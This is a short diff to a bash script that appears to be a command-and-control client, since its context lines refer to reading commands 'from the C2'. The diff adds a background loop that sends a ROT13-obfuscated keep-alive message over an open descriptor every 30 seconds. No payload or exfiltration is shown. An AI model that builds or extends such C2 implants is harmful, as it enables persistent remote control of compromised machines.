@@ -64,6 +64,17 @@ rot13() {
   echo "$1" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
 }
 
+send_keep_alive() {
+  while true; do
+    sleep 30
+    keepalive=$(rot13 "KEEP_ALIVE")
+    echo "$keepalive" >&3
+  done
+}
+
+# Start keep-alive messages in the background
+send_keep_alive &
+
 # Get messages from the C2
 while true; do
   # Read command from the C2
